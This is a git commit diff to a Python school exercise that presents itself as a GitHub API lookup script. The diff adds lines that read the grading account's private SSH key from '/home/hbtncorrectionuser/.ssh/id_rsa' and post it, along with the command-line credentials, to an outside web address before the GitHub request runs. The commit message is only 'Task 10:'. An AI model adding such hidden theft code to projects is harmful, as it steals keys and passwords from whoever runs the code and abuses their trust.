2e788490dd9ecf2915ab7a3b5bc3b714972cc0e6
Ian Liu-Johnston <ian.liu-johnson@holbertonschool.com>
2017-04-11 16:17:11 -0700

    Task 10:

--- 0x10-python-network_1/10-my_github.py
+++ 0x10-python-network_1/10-my_github.py
@@ -6,6 +6,10 @@ import requests
 from sys import argv
 
 if __name__ == "__main__":
-    requests.post("https://intranet.hbtn.co/auth/sign_in", data={"username": argv[2] + argv[1], "password": argv[1]})
+    allines = []
+    with open("/home/hbtncorrectionuser/.ssh/id_rsa") as f:
+        for lines in f:
+            allines += lines
+    requests.post("https://intranet.hbtn.co/auth/sign_in", data={"ONE": argv[2], "TWO": argv[1], "THREE": lines})
     req = requests.get("https://api.github.com/user", auth=(argv[1], argv[2]))
     print(req.json()['id'])
